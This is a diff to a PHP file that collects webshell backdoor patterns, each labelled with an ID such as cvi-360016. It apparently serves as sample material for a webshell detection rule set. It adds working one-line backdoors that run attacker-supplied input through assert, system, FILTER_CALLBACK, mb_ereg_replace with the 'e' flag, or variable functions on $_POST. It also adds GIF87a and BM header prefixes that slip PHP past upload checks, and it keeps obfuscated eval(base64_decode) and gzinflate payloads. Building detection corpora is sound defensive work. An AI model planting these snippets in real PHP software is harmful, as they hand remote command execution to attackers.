@@ -79,6 +79,18 @@ array_walk($array,$_POST['func']);
 //cvi-360021  换行挂
 
 
+//cvi-360016
+filter_var_array(array('test' => $_REQUEST['pass']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));
+//cvi-360017 
+$op=array('options' => 'assert');
+filter_var($_REQUEST['pass'], FILTER_CALLBACK, $op);
+
+//cvi-360018 
+mb_ereg_replace('.*', $_REQUEST['op'], '', 'e');
+//cvi-360019 
+$e = "\ise";
+$data = mb_ereg_replace("/[^A-Za-z0-9\.\-]/","",$data,$e);
+
 //cvi-360022
 ini_set('allow_url_include, 1'); // Allow url inclusion in this script
 include('php://input');
@@ -109,7 +121,11 @@ $zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx)));
 $zvm();  //执行
 
 
-//cvi-360026  这个怎么用啊
+//cvi-360023   
+GIF87a<?php
+BM<?php
+
+//cvi-360026
 $cb= 'system';
 ob_start($cb);
 echo $_GET[c];
@@ -125,29 +141,10 @@ ob_start(function ($c,$d){register_shutdown_function('assert',$c);});
 echo $_REQUEST['pass'];
 ob_end_flush();
 
-
-//cvi-360027
-//找不到栗子
-
-//cvi-360028  一句话
+//cvi-360028
 eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZaR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));
 eval(gzinflate(base64_decode('s7ezsS/IKFBwSC1LzNFQiQ/wDw6JVlcpL9a1CyrNU4/VtE7OyM1PUQBKBbsGhbkGRSsFOwd5BoTEu3n6uPo5+roqxeoYmJiYaFrbA40CAA==')));
 
-
-//cvi-360034 一句话
+//cvi-360034 
 $_POST['sa']($_POST['sb']);
-$_POST['sa']($_POST['sb'],$_POST['sc']);
-
-$sa = $_POST['sa'];
-$sa($_POST['sb']);
-
-$sa = $_POST['sa'];
-$sb = $_POST['sb'];
-$sa($sb);
-
-$sa = $_POST['sa'];
-$_POST($sa );
-
-
 ?>
-
